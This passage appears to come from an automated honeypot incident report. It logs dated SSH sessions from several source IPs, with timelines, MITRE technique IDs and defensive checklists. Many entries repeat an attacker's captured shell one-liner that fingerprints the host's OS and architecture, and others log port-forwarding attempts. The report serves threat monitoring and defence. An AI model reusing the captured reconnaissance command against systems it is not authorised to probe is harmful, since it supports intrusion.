| `2026-08-20 17:12:27` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7048f52ae6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:13 |
| **Last Seen** | 2026-08-20 17:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:13:28` | `cowrie.session.connect` |
| `2026-08-20 17:13:28` | `cowrie.client.version` |
| `2026-08-20 17:13:28` | `cowrie.client.kex` |
| `2026-08-20 17:13:29` | `cowrie.login.success` |
| `2026-08-20 17:13:30` | `cowrie.session.params` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.success` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:30` | `cowrie.command.input` |
| `2026-08-20 17:13:31` | `cowrie.log.closed` |
| `2026-08-20 17:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d81bd4e53b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:15 |
| **Last Seen** | 2026-08-20 17:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:15:06` | `cowrie.session.connect` |
| `2026-08-20 17:15:06` | `cowrie.client.version` |
| `2026-08-20 17:15:07` | `cowrie.client.kex` |
| `2026-08-20 17:15:07` | `cowrie.login.success` |
| `2026-08-20 17:15:09` | `cowrie.session.params` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.success` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.command.input` |
| `2026-08-20 17:15:09` | `cowrie.log.closed` |
| `2026-08-20 17:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08402d3c4eab

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:16 |
| **Last Seen** | 2026-08-20 17:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:16:45` | `cowrie.session.connect` |
| `2026-08-20 17:16:46` | `cowrie.client.version` |
| `2026-08-20 17:16:46` | `cowrie.client.kex` |
| `2026-08-20 17:16:47` | `cowrie.login.success` |
| `2026-08-20 17:16:48` | `cowrie.session.params` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.success` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:48` | `cowrie.command.input` |
| `2026-08-20 17:16:49` | `cowrie.log.closed` |
| `2026-08-20 17:16:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fe565d1b371

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:17 |
| **Last Seen** | 2026-08-20 17:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:17:39` | `cowrie.session.connect` |
| `2026-08-20 17:17:39` | `cowrie.client.version` |
| `2026-08-20 17:17:39` | `cowrie.client.kex` |
| `2026-08-20 17:17:41` | `cowrie.login.success` |
| `2026-08-20 17:17:41` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:17:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 17:17:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 17:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0603cdac3927

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:18 |
| **Last Seen** | 2026-08-20 17:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:18:23` | `cowrie.session.connect` |
| `2026-08-20 17:18:24` | `cowrie.client.version` |
| `2026-08-20 17:18:24` | `cowrie.client.kex` |
| `2026-08-20 17:18:26` | `cowrie.login.success` |
| `2026-08-20 17:18:27` | `cowrie.session.params` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.success` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.command.input` |
| `2026-08-20 17:18:27` | `cowrie.log.closed` |
| `2026-08-20 17:18:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb29528782e6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:20 |
| **Last Seen** | 2026-08-20 17:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:20:01` | `cowrie.session.connect` |
| `2026-08-20 17:20:01` | `cowrie.client.version` |
| `2026-08-20 17:20:01` | `cowrie.client.kex` |
| `2026-08-20 17:20:03` | `cowrie.login.success` |
| `2026-08-20 17:20:04` | `cowrie.session.params` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.success` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:04` | `cowrie.command.input` |
| `2026-08-20 17:20:05` | `cowrie.log.closed` |
| `2026-08-20 17:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc8fd86c48c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:21 |
| **Last Seen** | 2026-08-20 17:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:21:39` | `cowrie.session.connect` |
| `2026-08-20 17:21:40` | `cowrie.client.version` |
| `2026-08-20 17:21:40` | `cowrie.client.kex` |
| `2026-08-20 17:21:41` | `cowrie.login.success` |
| `2026-08-20 17:21:42` | `cowrie.session.params` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.success` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.command.input` |
| `2026-08-20 17:21:42` | `cowrie.log.closed` |
| `2026-08-20 17:21:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d6d9d1c910b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:23 |
| **Last Seen** | 2026-08-20 17:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:23:20` | `cowrie.session.connect` |
| `2026-08-20 17:23:20` | `cowrie.client.version` |
| `2026-08-20 17:23:20` | `cowrie.client.kex` |
| `2026-08-20 17:23:21` | `cowrie.login.success` |
| `2026-08-20 17:23:22` | `cowrie.session.params` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.success` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:22` | `cowrie.command.input` |
| `2026-08-20 17:23:23` | `cowrie.log.closed` |
| `2026-08-20 17:23:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6741e6f3d4d7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:26 |
| **Last Seen** | 2026-08-20 17:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:26:56` | `cowrie.session.connect` |
| `2026-08-20 17:26:56` | `cowrie.client.version` |
| `2026-08-20 17:26:56` | `cowrie.client.kex` |
| `2026-08-20 17:26:57` | `cowrie.login.success` |
| `2026-08-20 17:26:58` | `cowrie.session.params` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.success` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.command.input` |
| `2026-08-20 17:26:58` | `cowrie.log.closed` |
| `2026-08-20 17:26:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bade8fb97738

| Field | Detail |
|---|---|
| **Source IP** | `124.88.174[.]143` |
| **First Seen** | 2026-08-20 17:28 |
| **Last Seen** | 2026-08-20 17:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:28:21` | `cowrie.session.connect` |
| `2026-08-20 17:28:22` | `cowrie.client.version` |
| `2026-08-20 17:28:22` | `cowrie.client.kex` |
| `2026-08-20 17:28:25` | `cowrie.login.success` |
| `2026-08-20 17:28:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.88.174[.]143` to AbuseIPDB if not already reported
- [ ] Block `124.88.174[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b833099e91

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:28 |
| **Last Seen** | 2026-08-20 17:28 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:28:27` | `cowrie.session.connect` |
| `2026-08-20 17:28:27` | `cowrie.client.version` |
| `2026-08-20 17:28:27` | `cowrie.client.kex` |
| `2026-08-20 17:28:30` | `cowrie.login.success` |
| `2026-08-20 17:28:44` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:28:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d49480b5388d

| Field | Detail |
|---|---|
| **Source IP** | `170.247.3[.]15` |
| **First Seen** | 2026-08-20 17:28 |
| **Last Seen** | 2026-08-20 17:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:28:31` | `cowrie.session.connect` |
| `2026-08-20 17:28:32` | `cowrie.client.version` |
| `2026-08-20 17:28:32` | `cowrie.client.kex` |
| `2026-08-20 17:28:34` | `cowrie.login.success` |
| `2026-08-20 17:28:34` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:28:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.247.3[.]15` to AbuseIPDB if not already reported
- [ ] Block `170.247.3[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c95779d11c7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:28 |
| **Last Seen** | 2026-08-20 17:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:28:49` | `cowrie.session.connect` |
| `2026-08-20 17:28:49` | `cowrie.client.version` |
| `2026-08-20 17:28:50` | `cowrie.client.kex` |
| `2026-08-20 17:28:50` | `cowrie.login.success` |
| `2026-08-20 17:28:51` | `cowrie.session.params` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.success` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.command.input` |
| `2026-08-20 17:28:51` | `cowrie.log.closed` |
| `2026-08-20 17:28:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1030b3a2eb5f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 17:29 |
| **Last Seen** | 2026-08-20 17:29 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 17:29:08` | `cowrie.session.connect` |
| `2026-08-20 17:29:08` | `cowrie.client.version` |
| `2026-08-20 17:29:09` | `cowrie.client.kex` |
| `2026-08-20 17:29:10` | `cowrie.login.success` |
| `2026-08-20 17:29:24` | `cowrie.direct-tcpip.request` |
| `2026-08-20 17:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd8c0398be4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-08-20 17:30 |
| **Last Seen** | 2026-08-20 17:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

